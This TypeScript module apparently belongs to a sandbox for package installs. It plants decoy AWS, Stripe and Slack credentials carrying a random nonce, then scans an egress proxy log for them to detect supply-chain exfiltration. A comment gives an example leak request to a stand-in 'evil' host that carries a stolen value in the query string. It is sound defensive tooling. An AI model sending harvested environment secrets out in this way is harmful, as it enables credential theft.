import { randomBytes } from 'node:crypto';

/**
 * Canary credentials (honeytokens) for the egress boundary. The sandbox already DENIES egress by
 * default; canaries turn that wall into a tripwire that names the crime. We plant fake-but-realistic
 * credentials in the install container's environment — exactly the secrets a supply-chain thief
 * greps `process.env` for — each carrying a unique, unguessable nonce. {@link scanCanaryLog} searches
 * the egress proxy's log for the nonce AND every planted token value, so a leak of *any* honeytoken is
 * caught (not just the ones the nonce appears in verbatim — the AWS access-key id, for instance, is
 * uppercased to look real, so we match on its literal value too). A hit is unambiguous proof of an
 * exfiltration attempt, with none of the "is this denied host actually malicious?" ambiguity.
 *
 * HONEST SCOPE (this is the half that matters). The proxy is a forwarding HTTP/CONNECT proxy
 * (tinyproxy). It logs:
 *   • the full request line of PLAINTEXT HTTP requests — URL, path, and query string included, and
 *   • the `CONNECT host:port` line of HTTPS requests — host only.
 * So a canary leaked in a plaintext HTTP request (`GET http://evil/?k=<nonce>`) or used as a hostname
 * is caught; a canary smuggled inside an ENCRYPTED HTTPS body to an allowlisted host is NOT visible
 * here — that case is the egress allowlist's job, not the canary's. We detect what the proxy can
 * actually see and claim nothing more.
 *
 * Why these env names: AWS / Stripe / Slack credentials are prime harvest targets, and crucially none
 * are consumed by npm/pnpm/yarn/bun during an install — so planting them can't break a real install
 * (the reason canaries stay opt-in regardless). Each value also matches a {@link import('./secrets.js')}
 * rule shape, so a thief's own pattern-matching takes the bait.
 */
export interface Canary {
  /** The unique per-run marker, embedded (verbatim or transformed) in every planted token. Searchable. */
  nonce: string;
  /** Honeytoken env vars to inject into the container. Each VALUE is also a detection marker. */
  env: Record<string, string>;
}

/** A canary token observed leaving the box: the matching proxy log line(s), as evidence. */
export interface CanaryHit {
  /** The proxy log line the nonce appeared in (raw, for the audit trail). */
  line: string;
}

/** Default randomness source. Injectable so tests get deterministic nonces. */
function defaultRand(): string {
  return randomBytes(16).toString('hex');
}

/**
 * Mint a fresh set of canary honeytokens for one run. Every value derives from `nonce` (verbatim, or
 * uppercased/truncated to fit a provider's shape), and {@link scanCanaryLog} matches on the nonce AND
 * each value — so a leak of any one of them is detected. `rand` is injectable for tests.
 */
export function makeCanary(rand: () => string = defaultRand): Canary {
  const nonce = `cnry${rand()}`;
  // Each value carries the nonce inside an otherwise provider-shaped token.
  const pad = (s: string, len: number): string => (s + rand() + rand()).slice(0, len);
  return {
    nonce,
    env: {
      AWS_ACCESS_KEY_ID: `AKIA${nonce.replace(/[^A-Za-z0-9]/g, '').toUpperCase()}`.slice(0, 20).padEnd(20, 'X'),
      AWS_SECRET_ACCESS_KEY: pad(nonce, 40),
      STRIPE_SECRET_KEY: `sk_live_${pad(nonce, 24)}`,
      SLACK_TOKEN: `xoxb-${pad(nonce, 24)}`,
    },
  };
}

/** Every string whose appearance in egress proves a leak: the nonce plus each planted token value. */
export function canaryMarkers(canary: Canary): string[] {
  return [...new Set([canary.nonce, ...Object.values(canary.env)])].filter(Boolean);
}

/**
 * Scan the egress proxy log for any canary marker (nonce or planted token value). A non-empty result
 * is unambiguous: a value we planted, with no legitimate use, reached a request the proxy could see.
 * Matching on every value — not just the nonce — means a token whose shape forced a transform of the
 * nonce (e.g. the uppercased AWS id) is still caught. Returns the offending lines.
 */
export function scanCanaryLog(logText: string, canary: Canary): CanaryHit[] {
  const markers = canaryMarkers(canary);
  if (!markers.length) return [];
  return logText
    .split('\n')
    .filter((line) => markers.some((m) => line.includes(m)))
    .map((line) => ({ line: line.trim() }));
}
